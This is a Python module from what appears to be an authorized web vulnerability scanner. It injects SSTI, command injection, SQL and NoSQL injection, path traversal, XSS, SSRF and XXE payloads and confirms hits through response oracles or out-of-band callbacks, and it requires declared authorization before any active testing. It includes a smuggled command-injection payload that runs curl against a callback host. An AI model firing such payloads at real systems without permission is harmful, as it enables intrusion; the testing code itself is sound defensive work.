"""The `/inject` engine — inject payloads, let oracles verdict, prove blind bugs.

In-band classes (SSTI, command-echo, error/boolean SQLi, NoSQLi, path traversal,
SSRF→metadata) are confirmed from the response by :mod:`core.injection.oracles`.
Blind classes (SSRF, XXE, blind RCE, OOB SQLi) plant an OAST callback host from
:mod:`core.oast` and are confirmed only if a callback arrives — the callback,
not the LLM, is the verdict. Confirmed findings become ``PROOF_REFLECTED_MARKER``
or ``PROOF_OAST_CALLBACK`` :class:`VulnRecord` s + verified outcomes.

Safe by default: ``active=False`` returns the plan and sends nothing. Active
testing requires a declared ``authorization`` and a non-passive profile.
"""

from __future__ import annotations

import json
from dataclasses import dataclass, field
from datetime import datetime, timezone
from pathlib import Path
from typing import Any, Callable, Dict, List, Optional
from urllib.parse import urlencode, urlsplit, urlunsplit, parse_qsl

from core.injection import oracles, payloads
from core.payloads.feedback import record_confirmed as _fb_record
from core.injection.config import InjectionConfig, InjectionPoint
from core.injection.markers import MarkerFactory
from core.oast.outcome import vuln_record as _oast_vuln
from core.session.attach import engine_for
from core.webgraph import model as M
from core.webgraph.builder import build_graph
from core.webgraph.orchestrator import persist_records, serialize_graph
from core.webgraph.scope import endpoint_id as _eid
from core.webgraph.verified import record_confirmed

_TESTER = "tester"


def _now() -> str:
    """UTC ISO-8601 timestamp for the payload-feedback flywheel."""
    return datetime.now(timezone.utc).isoformat()


@dataclass
class InjectionRun:
    out_dir: str
    base_url: str
    active: bool
    points: int = 0
    classes: List[str] = field(default_factory=list)
    findings: List[Dict[str, Any]] = field(default_factory=list)
    warnings: List[str] = field(default_factory=list)
    requests_sent: int = 0
    node_count: int = 0
    edge_count: int = 0

    def to_dict(self) -> Dict[str, Any]:
        return {
            "out_dir": self.out_dir, "base_url": self.base_url, "active": self.active,
            "points": self.points, "classes": self.classes,
            "finding_count": len(self.findings), "findings": self.findings,
            "warnings": self.warnings, "requests_sent": self.requests_sent,
            "node_count": self.node_count, "edge_count": self.edge_count,
        }


def _with_query(url: str, param: str, value: str) -> str:
    parts = urlsplit(url)
    q = [(k, v) for k, v in parse_qsl(parts.query, keep_blank_values=True) if k != param]
    q.append((param, value))
    return urlunsplit((parts.scheme, parts.netloc, parts.path, urlencode(q), parts.fragment))


def _send(engine, identity: str, base_url: str, point: InjectionPoint, payload: str):
    method = point.method.upper()
    # Sibling params (the form's other fields, e.g. a Submit button) are sent at
    # their baseline value so the app's vulnerable code path runs; the injected
    # param carries the payload.
    siblings = {k: v for k, v in (point.others or {}).items() if k != point.param}
    if point.location == "query":
        parts = urlsplit(f"{base_url}{point.path}")
        q = [(k, v) for k, v in parse_qsl(parts.query, keep_blank_values=True)
             if k != point.param and k not in siblings]
        q.extend(siblings.items())
        q.append((point.param, payload))
        url = urlunsplit((parts.scheme, parts.netloc, parts.path, urlencode(q), parts.fragment))
        return engine.request(identity, method, url)
    fields = {**siblings, point.param: payload}
    if point.content_type == "json":
        body = json.dumps(fields).encode("utf-8")
        ct = "application/json"
    else:
        body = urlencode(fields).encode("utf-8")
        ct = "application/x-www-form-urlencoded"
    return engine.request(identity, method, f"{base_url}{point.path}", body=body,
                          headers={"Content-Type": ct})


def _body_text(resp) -> str:
    body = getattr(resp, "body", b"") or b""
    return body.decode("utf-8", errors="replace") if isinstance(body, bytes) else str(body)


class InjectionRunner:
    def __init__(self, engine, *, identity: str = _TESTER, oast=None, llm_model=None) -> None:
        self.engine = engine
        self.identity_name = identity   # session identity to inject as
        self.oast = oast
        self.llm_model = llm_model   # enables the LLM proposer (None = mechanical)
        self._markers = MarkerFactory()
        self._n = 0

    def _vid(self) -> str:
        self._n += 1
        return f"INJ-{self._n:04d}"

    def _finding(self, run, point, vuln_class, owasp, proof_kind, evidence, vulns):
        vid = self._vid()
        vulns.append(M.VulnRecord(
            id=vid, vuln_class=vuln_class, endpoint_id=_eid(point.method, point.path),
            param=point.param, severity="high", owasp=owasp,
            status=M.STATUS_CONFIRMED, proof_kind=proof_kind, evidence=evidence,
            source="injection",
        ).to_row())
        run.findings.append({"id": vid, "class": vuln_class, "point": point.label,
                             "proof": proof_kind})
        # Flywheel: remember every confirmed vector for cross-run learning. XSS
        # records its exact catalog id in the xss branch (proposer-relevant); the
        # generator-based classes have no catalog id yet, so log a builtin marker
        # (harmless to the proposer, useful to SAGE / the knowledge log).
        if vuln_class != "xss":
            technique = str(evidence.get("method") or evidence.get("technique")
                            or proof_kind)
            _fb_record(f"builtin:{vuln_class}", vuln_class, technique=technique,
                       target=run.base_url, timestamp=_now())

    def _inband(self, run, point, classes, vulns):
        eng, base = self.engine, run.base_url

        def send(pl):
            run.requests_sent += 1
            return _send(eng, self.identity_name, base, point, pl)

        if "ssti" in classes:
            for pl, expected in payloads.ssti(self._markers.next()):
                if oracles.ssti_confirmed(send(pl), expected):
                    self._finding(run, point, "ssti", "API8", M.PROOF_REFLECTED_MARKER,
                                  {"payload": pl, "marker": expected}, vulns)
                    break
        if "cmdi" in classes:
            for pl, expected in payloads.cmdi(self._markers.next()):
                # expected is the COMPUTED product — reflection can't match it
                if oracles.reflected(send(pl), expected):
                    self._finding(run, point, "cmdi", "API8", M.PROOF_REFLECTED_MARKER,
                                  {"payload": pl, "marker": expected}, vulns)
                    break
        if "sqli" in classes:
            hit = False
            for pl in payloads.sqli_error():
                db = oracles.sql_error(send(pl))
                if db:
                    self._finding(run, point, "sqli", "API8", M.PROOF_REFLECTED_MARKER,
                                  {"payload": pl, "db": db, "method": "error"}, vulns)
                    hit = True
                    break
            if not hit:
                baseline = send("1")
                for tp, fp in payloads.sqli_boolean():
                    # send TRUE twice for jitter control, then FALSE
                    if oracles.stable_boolean(baseline, send(tp), send(tp), send(fp)):
                        self._finding(run, point, "sqli", "API8", M.PROOF_REFLECTED_MARKER,
                                      {"true": tp, "false": fp, "method": "boolean"}, vulns)
                        break
        if "nosqli" in classes:
            baseline = send("1")
            for tp, fp in payloads.nosqli_boolean():
                if oracles.stable_boolean(baseline, send(tp), send(tp), send(fp)):
                    self._finding(run, point, "nosqli", "API8", M.PROOF_REFLECTED_MARKER,
                                  {"true": tp, "false": fp}, vulns)
                    break
        if "path_traversal" in classes:
            for pl, expected in payloads.path_traversal():
                if oracles.reflected(send(pl), expected):
                    self._finding(run, point, "path_traversal", "API8",
                                  M.PROOF_REFLECTED_MARKER, {"payload": pl}, vulns)
                    break
        if "xss" in classes:
            from core.payloads import default_store, detect_context, propose, record_confirmed
            m = self._markers.next()
            tok = m.token
            # 1. probe: send the bare marker, see WHERE it reflects (PortSwigger's lesson)
            contexts = detect_context(_body_text(send(tok)), tok)
            # 2. LLM proposes an ordering of context-appropriate catalog vectors
            #    (mechanical fallback when no model); the oracle still confirms.
            entries = propose(default_store(), "xss", context_hints=contexts,
                              response_excerpt=_body_text(send(tok)), model=self.llm_model,
                              target=run.base_url)
            for e in entries:
                rendered = e.render(tok=tok)
                if oracles.xss_reflected(send(rendered), e.expected(tok=tok)):
                    self._finding(run, point, "xss", "A03", M.PROOF_REFLECTED_MARKER,
                                  {"payload": rendered, "entry": e.id,
                                   "context": ",".join(contexts) or e.context}, vulns)
                    record_confirmed(e.id, "xss", technique=e.technique,
                                     target=run.base_url, timestamp=_now())
                    break
        if "ssrf_metadata" in classes:
            for pl in payloads.ssrf_metadata():
                if oracles.metadata_leak(send(pl)):
                    self._finding(run, point, "ssrf", "API7", M.PROOF_REFLECTED_MARKER,
                                  {"payload": pl, "method": "metadata"}, vulns)
                    break

    def _blind(self, run, point, classes) -> Dict[str, Dict[str, str]]:
        """Plant OAST payloads; return ``{finding_id: {class, endpoint_id, param}}``.

        Each planted payload embeds a freshly-minted callback host, so a later
        interaction correlates back to this exact injection point + class.
        """
        planted: Dict[str, Dict[str, str]] = {}
        if not self.oast:
            return planted
        eng, base = self.engine, run.base_url
        eid = _eid(point.method, point.path)

        def plant(vuln_class, build):
            fid = f"{self._vid()}:{vuln_class}:{point.param}"
            c = self.oast.new_interaction(finding_id=fid)
            planted[c.finding_id] = {"class": vuln_class, "endpoint_id": eid,
                                     "param": point.param}
            run.requests_sent += 1
            _send(eng, self.identity_name, base, point, build(c.host))

        if "ssrf" in classes:
            plant("ssrf", lambda h: f"http://{h}/")
        if "xxe" in classes:
            plant("xxe", payloads.xxe)
        if "cmdi_blind" in classes:
            plant("cmdi_blind", lambda h: f"; curl http://{h}/")
        if "sqli_oob" in classes:
            plant("sqli_oob", lambda h: payloads.sqli_oob(h)[0])
        return planted


def run_injection(
    config: InjectionConfig,
    *,
    out_dir,
    active: bool = False,
    profile: str = "safe",
    producing_model: str = "",
    client_factory: Optional[Callable[[List[str]], Any]] = None,
    oast=None,
    env: Optional[Dict[str, str]] = None,
    dom_xss_harness: Any = None,
    llm_model: Optional[str] = None,
) -> InjectionRun:
    out = Path(out_dir)
    (out / "normalized").mkdir(parents=True, exist_ok=True)
    have_oast = oast is not None
    classes = config.enabled_classes(have_oast=have_oast)
    run = InjectionRun(out_dir=str(out), base_url=config.base_url, active=active,
                       points=len(config.points), classes=classes)

    if active:
        if profile == "passive":
            raise ValueError("active injection cannot use the passive profile")
        if not config.authorization.strip():
            raise ValueError(
                "active injection refused: config.authorization is empty. Declare "
                "written authorization or omit --active for a dry-run plan."
            )

    if not active:
        run.findings = [{"point": p.label, "classes": classes, "planned": True}
                        for p in config.points]
        _finalize(out, run, {})
        return run

    # Resolve the session to inject as: a live engine threaded in by the
    # orchestrator (cookie jar + bearer at once) is reused; otherwise a fresh
    # engine is built and its tester identity seeded from token_env / cookies /
    # headers. This is what carries a login-established cookie session onto every
    # injection request (not just a bearer string).
    engine, ident_name, warns = engine_for(
        config.base_url, session=config.session, cookies=config.cookies,
        headers=config.headers, token_env=config.token_env, env=env,
        client_factory=client_factory, identity_name=_TESTER)
    run.warnings.extend(warns)
    ident = engine.identity(ident_name)

    runner = InjectionRunner(engine, identity=ident_name, oast=oast, llm_model=llm_model)
    vulns: List[Dict[str, Any]] = []
    planted: Dict[str, Dict[str, str]] = {}
    for point in config.points:
        # A fragment (SPA hash-route) param is client-side only — it never
        # reaches the server, so no HTTP in-band/blind oracle can see it. It is
        # tested exclusively by the DOM-XSS oracle below.
        if point.location == "fragment":
            continue
        try:
            runner._inband(run, point, classes, vulns)
            planted.update(runner._blind(run, point, classes))
        except Exception as exc:
            run.warnings.append(f"{point.label}: {type(exc).__name__}: {exc}")

    # DOM-XSS: confirm execution in a real browser (SPA XSS the HTTP oracle misses)
    if dom_xss_harness is not None and "xss" in classes:
        try:
            from core.injection.dom_xss import confirm_dom_xss
            hits = confirm_dom_xss(dom_xss_harness, config.base_url, config.points,
                                   session_headers=ident.auth_headers or None,
                                   model=llm_model)
            for hit in hits:
                point = hit["point"]
                runner._finding(run, point, "xss", "A03", M.PROOF_STATE_ORACLE,
                                {"payload": hit["payload"], "context": "dom-executed"}, vulns)
                # feed the flywheel the exact DOM vector that executed
                _fb_record(hit.get("entry", "builtin:xss-dom"), "xss",
                           technique="dom-executed", target=config.base_url,
                           timestamp=_now())
        except Exception as exc:
            run.warnings.append(f"dom-xss pass failed: {type(exc).__name__}: {exc}")

    # poll OAST for blind confirmations
    if oast and planted:
        for fid, hits in oast.confirmations().items():
            meta = planted.get(fid, {})
            vid = fid.split(":", 1)[0]
            vulns.append(_oast_vuln(hits, vuln_id=vid, vuln_class=meta.get("class", "blind"),
                                    endpoint_id=meta.get("endpoint_id", ""),
                                    param=meta.get("param", ""), owasp="API7"))
            run.findings.append({"id": vid, "class": meta.get("class", "blind"),
                                 "proof": M.PROOF_OAST_CALLBACK})

    accumulated = {M.VulnRecord.KIND: vulns} if vulns else {}
    _finalize(out, run, accumulated)
    if vulns:
        record_confirmed(vulns, project_dir=out, producing_model=producing_model)
    return run


def _finalize(out: Path, run: InjectionRun, accumulated) -> None:
    graph = build_graph(accumulated, [run.base_url])
    persist_records(out / "normalized", accumulated)
    serialize_graph(out / "graph", graph)
    stats = graph.stats()
    run.node_count, run.edge_count = stats["node_count"], stats["edge_count"]
    (out / "injection-findings.json").write_text(
        json.dumps(run.to_dict(), indent=2), encoding="utf-8")


__all__ = ["InjectionRun", "InjectionRunner", "run_injection"]
